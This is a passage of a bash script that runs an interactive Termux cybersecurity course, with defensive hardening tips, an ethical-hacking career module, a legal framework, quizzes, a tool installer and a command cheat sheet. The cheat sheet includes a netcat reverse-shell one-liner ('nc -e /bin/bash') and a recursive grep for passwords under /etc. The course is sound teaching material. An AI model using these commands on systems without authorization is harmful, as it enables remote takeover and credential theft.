    echo -e "${WHITE}     ufw default deny incoming${NC}"
    echo -e "${WHITE}     ufw allow 22/tcp${NC}"
    echo ""
    echo -e "${GREEN}  ✅ Remove unused packages${NC}"
    echo -e "${WHITE}     apt autoremove${NC}"
    echo ""
    echo -e "${GREEN}  ✅ Check for SUID files (privilege escalation risk)${NC}"
    echo -e "${WHITE}     find / -perm -4000 -type f 2>/dev/null${NC}"
    echo ""
    echo -e "${GREEN}  ✅ Check listening ports${NC}"
    echo -e "${WHITE}     ss -tulpn | grep LISTEN${NC}"
    echo ""
    echo -e "${GREEN}  ✅ Set password policies${NC}"
    echo -e "${WHITE}     /etc/login.defs  # Password aging${NC}"
    
    press_enter
    
    echo -e "${BOLD}${CYAN}🔐 SECURE PASSWORD PRACTICES:${NC}"
    print_separator
    echo -e "${WHITE}
  PASSWORD STRENGTH REQUIREMENTS:
  ├── Minimum 12 characters (16+ preferred)
  ├── Mix of: Uppercase, Lowercase, Numbers, Symbols
  ├── No dictionary words
  ├── No personal information
  ├── Unique for each account
  └── Changed regularly

  PASSWORD MANAGERS:
  • Bitwarden  - Open source, free
  • KeePassXC  - Offline, open source
  • 1Password  - Commercial
  • LastPass   - Cloud-based

  MULTI-FACTOR AUTHENTICATION (MFA):
  ├── Something you KNOW (password)
  ├── Something you HAVE (phone, token)
  └── Something you ARE (fingerprint, face)

  MFA TYPES:
  ├── TOTP - Time-based One Time Password (Google Auth)
  ├── HOTP - HMAC-based OTP
  ├── SMS  - Text message (less secure)
  ├── Hardware Token - YubiKey, RSA SecurID
  └── Push Notification - Duo, Authy
${NC}"

    press_enter
    
    # Quiz
    echo -e "${BOLD}${YELLOW}📝 MODULE 9 QUIZ${NC}"
    print_separator
    
    score=0
    
    quiz_question \
        "What is the difference between IDS and IPS?" \
        "ips blocks threats" \
        "One detects, the other acts on threats..."
    [ $? -eq 0 ] && ((score++))
    
    echo ""
    quiz_question \
        "Which SSH config option prevents root login?" \
        "permitrootlogin no" \
        "Found in /etc/ssh/sshd_config..."
    [ $? -eq 0 ] && ((score++))
    
    echo ""
    quiz_question \
        "What does MFA stand for?" \
        "multi-factor authentication" \
        "Multiple verification methods..."
    [ $? -eq 0 ] && ((score++))
    
    echo ""
    echo -e "${CYAN}Your Score: $score/3${NC}"
    [ $score -ge 2 ] && save_progress "module9" "completed" && \
        echo -e "${GREEN}🎉 Module 9 Completed!${NC}"
    
    press_enter
}

# ============================================
# MODULE 10: ETHICAL HACKING & CAREER
# ============================================

module10_career() {
    print_banner
    echo -e "${BOLD}${GREEN}MODULE 10: ETHICAL HACKING & CAREER PATH${NC}"
    print_separator
    
    echo -e "${WHITE}
⚖️ ETHICAL HACKING:
────────────────────
  Ethical hackers (White Hat) are authorized to attack
  systems to identify vulnerabilities BEFORE malicious
  hackers do.

  TYPES OF HACKERS:
  ${GREEN}WHITE HAT${WHITE}  - Authorized security testers
  ${RED}BLACK HAT${WHITE}  - Malicious, unauthorized attackers
  ${YELLOW}GREY HAT${WHITE}   - Sometimes unauthorized, rarely malicious

  PENETRATION TESTING METHODOLOGY:
  ┌──────────────────────────────────────┐
  │  1. PLANNING & RECONNAISSANCE        │
  │     Define scope, gather info        │
  ├──────────────────────────────────────┤
  │  2. SCANNING & ENUMERATION           │
  │     Port scan, service detection     │
  ├──────────────────────────────────────┤
  │  3. VULNERABILITY ANALYSIS           │
  │     Find weaknesses                  │
  ├──────────────────────────────────────┤
  │  4. EXPLOITATION                     │
  │     Attempt to exploit vulns         │
  ├──────────────────────────────────────┤
  │  5. POST-EXPLOITATION                │
  │     Maintain access, pivot           │
  ├──────────────────────────────────────┤
  │  6. REPORTING                        │
  │     Document findings                │
  └──────────────────────────────────────┘
${NC}"

    press_enter
    
    echo -e "${BOLD}${CYAN}📜 CERTIFICATIONS:${NC}"
    print_separator
    echo -e "${WHITE}
  BEGINNER:
  ${GREEN}CompTIA Security+${WHITE}      - Entry level security
  ${GREEN}CompTIA Network+${WHITE}       - Networking fundamentals
  ${GREEN}CEH (Certified Ethical Hacker)${WHITE} - EC-Council

  INTERMEDIATE:
  ${CYAN}OSCP${WHITE} - Offensive Security Certified Professional
  ${CYAN}eJPT${WHITE} - eLearnSecurity Junior Penetration Tester
  ${CYAN}CompTIA PenTest+${WHITE} - Penetration testing

  ADVANCED:
  ${PURPLE}CISSP${WHITE}  - Certified Info Security Professional
  ${PURPLE}OSEP${WHITE}   - Advanced penetration testing
  ${PURPLE}CRTP${WHITE}   - Certified Red Team Professional
  ${PURPLE}OSED${WHITE}   - Exploit developer certification

  SPECIALIZED:
  ${YELLOW}CCNA Security${WHITE}  - Cisco network security
  ${YELLOW}AWS Security${WHITE}   - Cloud security
  ${YELLOW}CISM${WHITE}          - Security management
  ${YELLOW}GPEN${WHITE}          - GIAC Penetration Tester
${NC}"

    press_enter
    
    echo -e "${BOLD}${CYAN}🎯 CAREER PATHS:${NC}"
    print_separator
    echo -e "${WHITE}
  OFFENSIVE ROLES:
  ├── Penetration Tester    - Test systems for vulnerabilities
  ├── Red Team Operator     - Simulate real attacks
  ├── Bug Bounty Hunter     - Find and report bugs for reward
  └── Exploit Developer     - Create proof-of-concept exploits

  DEFENSIVE ROLES:
  ├── SOC Analyst           - Monitor security events
  ├── Incident Responder    - Handle security breaches
  ├── Threat Hunter         - Proactively find threats
  ├── Forensics Analyst     - Investigate cyber crimes
  └── Blue Team Member      - Defensive security team

  SPECIALIZED ROLES:
  ├── Application Security Engineer
  ├── Cloud Security Architect
  ├── Security Researcher
  ├── Malware Analyst
  ├── Cryptographer
  └── CISO (Chief Information Security Officer)

  AVERAGE SALARIES (US):
  ├── Junior Analyst:      \$55,000 - \$75,000
  ├── Security Engineer:   \$85,000 - \$115,000
  ├── Penetration Tester:  \$90,000 - \$130,000
  ├── Security Architect:  \$120,000 - \$160,000
  └── CISO:                \$150,000 - \$250,000+
${NC}"

    press_enter
    
    echo -e "${BOLD}${CYAN}📚 LEARNING RESOURCES:${NC}"
    print_separator
    echo -e "${WHITE}
  FREE PLATFORMS:
  ├── ${CYAN}TryHackMe.com${WHITE}        - Beginner friendly (BEST START!)
  ├── ${CYAN}HackTheBox.com${WHITE}       - More challenging CTFs
  ├── ${CYAN}PortSwigger Academy${WHITE}  - Web security (Free!)
  ├── ${CYAN}OWASP.org${WHITE}            - Web security resources
  ├── ${CYAN}VulnHub.com${WHITE}          - Vulnerable VMs download
  └── ${CYAN}PicoCTF.com${WHITE}          - CTF for beginners

  YOUTUBE CHANNELS:
  ├── NetworkChuck
  ├── IppSec (HackTheBox walkthroughs)
  ├── TheCyberMentor
  ├── LiveOverflow
  ├── John Hammond
  └── STÖK (Bug Bounty)

  BOOKS:
  ├── 'Hacking: The Art of Exploitation' - Jon Erickson
  ├── 'The Web Application Hacker's Handbook'
  ├── 'Penetration Testing' - Georgia Weidman
  └── 'The Hacker Playbook 3' - Peter Kim

  CTF RESOURCES:
  ├── CTFtime.org     - CTF calendar
  ├── ctf101.org      - CTF basics
  └── PicoCTF         - Beginner CTFs
${NC}"

    press_enter
    
    echo -e "${BOLD}${CYAN}💰 BUG BOUNTY PROGRAMS:${NC}"
    print_separator
    echo -e "${WHITE}
  Bug Bounty allows you to legally hack companies
  and earn money for finding vulnerabilities!

  PLATFORMS:
  ├── HackerOne.com    - Largest bug bounty platform
  ├── Bugcrowd.com     - Another major platform
  ├── Synack           - Vetted researchers
  ├── Intigriti.com    - European platform
  └── Cobalt.io        - Pentest as a service

  TOP PAYING PROGRAMS:
  ├── Google          - Up to \$31,337 per bug
  ├── Microsoft       - Up to \$250,000 per bug
  ├── Apple           - Up to \$1,000,000 per bug
  ├── Facebook        - Minimum \$500 per bug
  └── HackerOne Hall of Fame programs

  GETTING STARTED:
  1. Learn web application testing basics
  2. Study OWASP Top 10
  3. Practice on HackTheBox/TryHackMe
  4. Start with public programs on HackerOne
  5. Read disclosure reports for learning
  6. Focus on one bug type first (e.g., XSS)
${NC}"

    press_enter
    
    echo -e "${BOLD}${CYAN}⚖️ LEGAL FRAMEWORK:${NC}"
    print_separator
    echo -e "${WHITE}
  IMPORTANT LAWS TO KNOW:

  USA:
  ├── Computer Fraud and Abuse Act (CFAA)
  │   Prohibits unauthorized computer access
  └── Electronic Communications Privacy Act

  EU:
  └── Network and Information Systems Directive

  ALWAYS REMEMBER:
  ${RED}✗ NEVER${WHITE} scan or attack systems without permission
  ${RED}✗ NEVER${WHITE} access data you're not authorized to view
  ${RED}✗ NEVER${WHITE} share vulnerabilities publicly without disclosure
  ${GREEN}✓ ALWAYS${WHITE} get written authorization before testing
  ${GREEN}✓ ALWAYS${WHITE} document your activities
  ${GREEN}✓ ALWAYS${WHITE} follow responsible disclosure practices
  ${GREEN}✓ ALWAYS${WHITE} report findings to the appropriate parties

  SCOPE OF AUTHORIZATION:
  ├── Define exact targets (IPs, domains)
  ├── Define testing windows (time/date)
  ├── Define allowed techniques
  └── Emergency contacts
${NC}"

    press_enter
    
    echo -e "${BOLD}${PURPLE}🔧 SETUP YOUR LAB:${NC}"
    print_separator
    echo -e "${WHITE}
  HOME LAB SETUP:

  1. VIRTUAL MACHINES:
     • VirtualBox (Free) or VMware
     • Kali Linux (Attacker)
     • Metasploitable 2/3 (Target VM)
     • DVWA (Damn Vulnerable Web App)
     • VulnHub machines

  2. NETWORK SETUP:
     • Host-only network for isolation
     • NAT for internet access when needed
     • Multiple VMs on same subnet

  3. TOOLS TO INSTALL:
${NC}"
    echo -e "${GREEN}  pkg update && pkg upgrade${NC}"
    echo -e "${GREEN}  pkg install nmap python git curl wget${NC}"
    echo -e "${GREEN}  pkg install metasploit openssh${NC}"
    echo -e "${GREEN}  pip install requests scapy${NC}"
    
    press_enter
    
    # Final Quiz
    echo -e "${BOLD}${YELLOW}📝 MODULE 10 QUIZ${NC}"
    print_separator
    
    score=0
    
    quiz_question \
        "What is an ethical hacker also called?" \
        "white hat" \
        "The color associated with good guys..."
    [ $? -eq 0 ] && ((score++))
    
    echo ""
    quiz_question \
        "Which certification is best for beginners in security?" \
        "security+" \
        "CompTIA's entry-level security certification..."
    [ $? -eq 0 ] && ((score++))
    
    echo ""
    quiz_question \
        "What platform is best for beginner CTFs/learning?" \
        "tryhackme" \
        "Try... Hack... Me..."
    [ $? -eq 0 ] && ((score++))
    
    echo ""
    echo -e "${CYAN}Your Score: $score/3${NC}"
    [ $score -ge 2 ] && save_progress "module10" "completed" && \
        echo -e "${GREEN}🎉 Module 10 Completed!${NC}"
    
    press_enter
}

# ============================================
# COURSE PROGRESS VIEWER
# ============================================

view_progress() {
    print_banner
    echo -e "${BOLD}${GREEN}📊 YOUR COURSE PROGRESS${NC}"
    print_separator
    echo ""
    echo -e "${WHITE}  $(check_progress 'module1')  Module 1: Introduction to Cybersecurity${NC}"
    echo -e "${WHITE}  $(check_progress 'module2')  Module 2: Linux & Termux Fundamentals${NC}"
    echo -e "${WHITE}  $(check_progress 'module3')  Module 3: Networking Concepts${NC}"
    echo -e "${WHITE}  $(check_progress 'module4')  Module 4: Information Gathering & OSINT${NC}"
    echo -e "${WHITE}  $(check_progress 'module5')  Module 5: Scanning & Enumeration${NC}"
    echo -e "${WHITE}  $(check_progress 'module6')  Module 6: Web Application Security${NC}"
    echo -e "${WHITE}  $(check_progress 'module7')  Module 7: Cryptography${NC}"
    echo -e "${WHITE}  $(check_progress 'module8')  Module 8: Malware Analysis${NC}"
    echo -e "${WHITE}  $(check_progress 'module9')  Module 9: Defensive Security${NC}"
    echo -e "${WHITE}  $(check_progress 'module10') Module 10: Ethical Hacking & Career${NC}"
    echo ""
    
    if [ -f "$PROGRESS_FILE" ]; then
        completed=$(grep -c "=completed" "$PROGRESS_FILE" 2>/dev/null || echo 0)
        total=10
        percent=$((completed * 100 / total))
        
        echo -e "${CYAN}Progress: $completed/$total modules (${percent}%)${NC}"
        echo ""
        
        echo -ne "${GREEN}["
        for i in $(seq 1 $((percent / 5))); do echo -ne "█"; done
        for i in $(seq 1 $((20 - percent / 5))); do echo -ne "░"; done
        echo -e "] ${percent}%${NC}"
        
        if [ "$completed" -eq 10 ]; then
            echo ""
            echo -e "${YELLOW}🏆 CONGRATULATIONS! You've completed the entire course!${NC}"
            echo -e "${GREEN}You are now ready to start your cybersecurity journey!${NC}"
        fi
    else
        echo -e "${YELLOW}No progress saved yet. Start a module to begin!${NC}"
    fi
    
    press_enter
}

# ============================================
# NOTES SYSTEM
# ============================================

take_notes() {
    print_banner
    echo -e "${BOLD}${GREEN}📝 NOTES SYSTEM${NC}"
    print_separator
    echo ""
    echo -e "${WHITE}1) Add a note${NC}"
    echo -e "${WHITE}2) View notes${NC}"
    echo -e "${WHITE}3) Clear notes${NC}"
    echo -e "${WHITE}4) Back${NC}"
    echo ""
    echo -ne "${YELLOW}Select: ${NC}"
    read -r note_choice
    
    case $note_choice in
        1)
            echo -ne "${YELLOW}Enter your note: ${NC}"
            read -r note
            echo "[$(date '+%Y-%m-%d %H:%M')] $note" >> "$NOTES_FILE"
            echo -e "${GREEN}✅ Note saved!${NC}"
            press_enter
            ;;
        2)
            if [ -f "$NOTES_FILE" ] && [ -s "$NOTES_FILE" ]; then
                echo -e "${CYAN}Your Notes:${NC}"
                print_separator
                cat "$NOTES_FILE"
            else
                echo -e "${YELLOW}No notes yet!${NC}"
            fi
            press_enter
            ;;
        3)
            echo -ne "${RED}Clear all notes? (y/n): ${NC}"
            read -r confirm
            if [[ "$confirm" == "y" ]]; then
                > "$NOTES_FILE"
                echo -e "${GREEN}Notes cleared!${NC}"
            fi
            press_enter
            ;;
        4)
            return
            ;;
    esac
}

# ============================================
# TOOLS INSTALLER
# ============================================

install_tools() {
    print_banner
    echo -e "${BOLD}${GREEN}🔧 SECURITY TOOLS INSTALLER${NC}"
    print_separator
    echo ""
    echo -e "${WHITE}Select tools to install:${NC}"
    echo ""
    echo -e "${GREEN}1)${WHITE} Essential Tools (nmap, wget, curl, git)${NC}"
    echo -e "${GREEN}2)${WHITE} Network Tools (netcat, nmap, traceroute)${NC}"
    echo -e "${GREEN}3)${WHITE} Python Security Libraries${NC}"
    echo -e "${GREEN}4)${WHITE} Password Tools (hashcat, john)${NC}"
    echo -e "${GREEN}5)${WHITE} Web Tools (gobuster, dirb)${NC}"
    echo -e "${GREEN}6)${WHITE} ALL Tools${NC}"
    echo -e "${GREEN}7)${WHITE} Back${NC}"
    echo ""
    echo -ne "${YELLOW}Select: ${NC}"
    read -r tool_choice
    
    case $tool_choice in
        1)
            echo -e "${GREEN}Installing essential tools...${NC}"
            pkg update -y
            pkg install -y nmap wget curl git python openssh openssl
            echo -e "${GREEN}✅ Essential tools installed!${NC}"
            ;;
        2)
            echo -e "${GREEN}Installing network tools...${NC}"
            pkg install -y nmap netcat-openbsd traceroute dnsutils whois
            echo -e "${GREEN}✅ Network tools installed!${NC}"
            ;;
        3)
            echo -e "${GREEN}Installing Python libraries...${NC}"
            pkg install -y python
            pip install requests scapy dnspython paramiko colorama
            echo -e "${GREEN}✅ Python libraries installed!${NC}"
            ;;
        4)
            echo -e "${GREEN}Installing password tools...${NC}"
            pkg install -y hashcat john
            echo -e "${GREEN}✅ Password tools installed!${NC}"
            ;;
        5)
            echo -e "${GREEN}Installing web tools...${NC}"
            pkg install -y golang
            go install github.com/OJ/gobuster/v3@latest 2>/dev/null
            echo -e "${GREEN}✅ Web tools installed!${NC}"
            ;;
        6)
            echo -e "${GREEN}Installing ALL tools...${NC}"
            pkg update -y
            pkg install -y nmap wget curl git python openssh openssl \
                netcat-openbsd traceroute dnsutils whois hashcat john golang
            pip install requests scapy dnspython paramiko colorama 2>/dev/null
            echo -e "${GREEN}✅ All tools installed!${NC}"
            ;;
        7) return ;;
    esac
    press_enter
}

# ============================================
# CHEAT SHEET
# ============================================

cheat_sheet() {
    print_banner
    echo -e "${BOLD}${GREEN}📋 QUICK REFERENCE CHEAT SHEET${NC}"
    print_separator
    
    echo -e "${BOLD}${CYAN}NMAP:${NC}"
    echo -e "${GREEN}nmap -sV -sC target${NC}    ${WHITE}# Default scripts + version${NC}"
    echo -e "${GREEN}nmap -A -p- target${NC}     ${WHITE}# Aggressive full scan${NC}"
    echo -e "${GREEN}nmap --script=vuln target${NC} ${WHITE}# Vulnerability scan${NC}"
    
    echo ""
    echo -e "${BOLD}${CYAN}NETCAT:${NC}"
    echo -e "${GREEN}nc -lvp 4444${NC}           ${WHITE}# Listen on port 4444${NC}"
    echo -e "${GREEN}nc target 4444${NC}         ${WHITE}# Connect to target${NC}"
    echo -e "${GREEN}nc -e /bin/bash target 4444${NC} ${WHITE}# Reverse shell${NC}"
    
    echo ""
    echo -e "${BOLD}${CYAN}CURL:${NC}"
    echo -e "${GREEN}curl -I http://target${NC}  ${WHITE}# Headers only${NC}"
    echo -e "${GREEN}curl -X POST -d 'data' url${NC} ${WHITE}# POST request${NC}"
    echo -e "${GREEN}curl -b 'cookie=val' url${NC} ${WHITE}# With cookies${NC}"
    
    echo ""
    echo -e "${BOLD}${CYAN}HASHING:${NC}"
    echo -e "${GREEN}echo -n 'text' | md5sum${NC}    ${WHITE}# MD5 hash${NC}"
    echo -e "${GREEN}echo -n 'text' | sha256sum${NC}  ${WHITE}# SHA256 hash${NC}"
    
    echo ""
    echo -e "${BOLD}${CYAN}SSH:${NC}"
    echo -e "${GREEN}ssh user@target${NC}         ${WHITE}# SSH connect${NC}"
    echo -e "${GREEN}ssh -p 2222 user@target${NC} ${WHITE}# Custom port${NC}"
    echo -e "${GREEN}ssh-keygen -t rsa -b 4096${NC} ${WHITE}# Generate key${NC}"
    echo -e "${GREEN}ssh-copy-id user@target${NC}  ${WHITE}# Copy key to server${NC}"
    
    echo ""
    echo -e "${BOLD}${CYAN}FILE TRANSFER:${NC}"
    echo -e "${GREEN}scp file user@target:/path${NC} ${WHITE}# SCP upload${NC}"
    echo -e "${GREEN}scp user@target:/file .${NC}    ${WHITE}# SCP download${NC}"
    echo -e "${GREEN}wget http://target/file${NC}    ${WHITE}# Download file${NC}"
    echo -e "${GREEN}curl -O http://target/file${NC} ${WHITE}# Download file${NC}"
    
    echo ""
    echo -e "${BOLD}${CYAN}GREP TRICKS:${NC}"
    echo -e "${GREEN}grep -r 'password' /etc/${NC}  ${WHITE}# Recursive search${NC}"
    echo -e "${GREEN}grep -i 'error' log.txt${NC}   ${WHITE}# Case insensitive${NC}"
    echo -e "${GREEN}grep -v 'comment' file${NC}    ${WHITE}# Inverse match${NC}"
    echo -e "${GREEN}grep -n 'text' file${NC}       ${WHITE}# Show line numbers${NC}"
    
    press_enter
}

# ============================================
# MAIN MENU
# ============================================

main_menu() {
    while true; do
        print_banner
        
        echo -e "${BOLD}${WHITE}               MAIN MENU${NC}"
        echo ""
        echo -e "${GREEN} [1]${WHITE}  Module 1:  Introduction to Cybersecurity    ${GREEN}$(check_progress 'module1')${NC}"
        echo -e "${GREEN} [2]${WHITE}  Module 2:  Linux & Termux Fundamentals       ${GREEN}$(check_progress 'module2')${NC}"
        echo -e "${GREEN} [3]${WHITE}  Module 3:  Networking Concepts               ${GREEN}$(check_progress 'module3')${NC}"
        echo -e "${GREEN} [4]${WHITE}  Module 4:  Information Gathering & OSINT     ${GREEN}$(check_progress 'module4')${NC}"
        echo -e "${GREEN} [5]${WHITE}  Module 5:  Scanning & Enumeration            ${GREEN}$(check_progress 'module5')${NC}"
        echo -e "${GREEN} [6]${WHITE}  Module 6:  Web Application Security          ${GREEN}$(check_progress 'module6')${NC}"
        echo -e "${GREEN} [7]${WHITE}  Module 7:  Cryptography                      ${GREEN}$(check_progress 'module7')${NC}"
        echo -e "${GREEN} [8]${WHITE}  Module 8:  Malware Analysis                  ${GREEN}$(check_progress 'module8')${NC}"
        echo -e "${GREEN} [9]${WHITE}  Module 9:  Defensive Security                ${GREEN}$(check_progress 'module9')${NC}"
        echo -e "${GREEN} [10]${WHITE} Module 10: Ethical Hacking & Career          ${GREEN}$(check_progress 'module10')${NC}"
        echo ""
        print_separator
        echo -e "${CYAN} [P]${WHITE}  View Progress"
        echo -e "${CYAN} [N]${WHITE}  Notes"
        echo -e "${CYAN} [T]${WHITE}  Install Tools"
        echo -e "${CYAN} [C]${WHITE}  Cheat Sheet"
        echo -e "${RED} [Q]${WHITE}  Quit"
        print_separator
        echo ""
        echo -ne "${YELLOW}Choose an option: ${NC}"
        read -r choice
        
        case $choice in
            1)  module1_intro ;;
            2)  module2_linux ;;
            3)  module3_networking ;;
            4)  module4_osint ;;
            5)  module5_scanning ;;
            6)  module6_webapp ;;
            7)  module7_crypto ;;
            8)  module8_malware ;;
            9)  module9_defensive ;;
            10) module10_career ;;
            [Pp]) view_progress ;;
            [Nn]) take_notes ;;
            [Tt]) install_tools ;;
            [Cc]) cheat_sheet ;;
            [Qq])
                clear_screen
                echo -e "${RED}"
                echo "  ╔═══════════════════════════════════════╗"
                echo "  ║   Thank you for learning with us!    ║"
                echo "  ║   Keep learning, stay ethical!       ║"
                echo "  ║   Hack the planet... legally! 🌍     ║"
                echo "  ╚═══════════════════════════════════════╝"
                echo -e "${NC}"
                exit 0
                ;;
            *)
                echo -e "${RED}Invalid option!${NC}"
                sleep 1
                ;;
        esac
    done
}

# ============================================
# STARTUP CHECK & INITIALIZATION
# ============================================

startup() {
    # Check if running in Termux
    if [ ! -d "/data/data/com.termux" ] && [ -z "$TERMUX_VERSION" ]; then
        echo -e "${YELLOW}⚠️  Warning: Not running in Termux environment${NC}"
        echo -e "${WHITE}Some features may not work correctly.${NC}"
        echo -e "${WHITE}This course is optimized for Termux on Android.${NC}"
        echo ""
        echo -ne "${YELLOW}Continue anyway? (y/n): ${NC}"
        read -r continue_choice
        [[ "$continue_choice" != "y" && "$continue_choice" != "Y" ]] && exit 0
    fi
    
    # Initialize progress file
    if [ ! -f "$PROGRESS_FILE" ]; then
        touch "$PROGRESS_FILE"
    fi
    
    # Welcome screen
    print_banner
    echo -e "${WHITE}Welcome to the Termux Cyber Security Course!${NC}"
    echo ""
    echo -e "${YELLOW}⚠️  DISCLAIMER:${NC}"
    echo -e "${WHITE}This course is for educational purposes ONLY.${NC}"
    echo -e "${WHITE}Only use these techniques on systems you OWN${NC}"
    echo -e "${WHITE}or have EXPLICIT WRITTEN PERMISSION to test.${NC}"
    echo -e "${WHITE}Unauthorized hacking is ILLEGAL and UNETHICAL.${NC}"
    echo ""
    echo -e "${GREEN}What you'll learn:${NC}"
    echo -e "${WHITE}  • Cybersecurity fundamentals${NC}"
    echo -e "${WHITE}  • Linux and networking concepts${NC}"
    echo -e "${WHITE}  • Web application security${NC}"
    echo -e "${WHITE}  • Cryptography and encryption${NC}"
    echo -e "${WHITE}  • Defensive security techniques${NC}"
    echo -e "${WHITE}  • Ethical hacking methodology${NC}"
    echo ""
    print_separator
    echo -ne "${YELLOW}Accept disclaimer and begin? (y/n): ${NC}"
    read -r accept
    
    if [[ "$accept" == "y" || "$accept" == "Y" ]]; then
        main_menu
    else
        echo -e "${RED}Exiting...${NC}"
        exit 0
    fi
}

# Run the course
startup
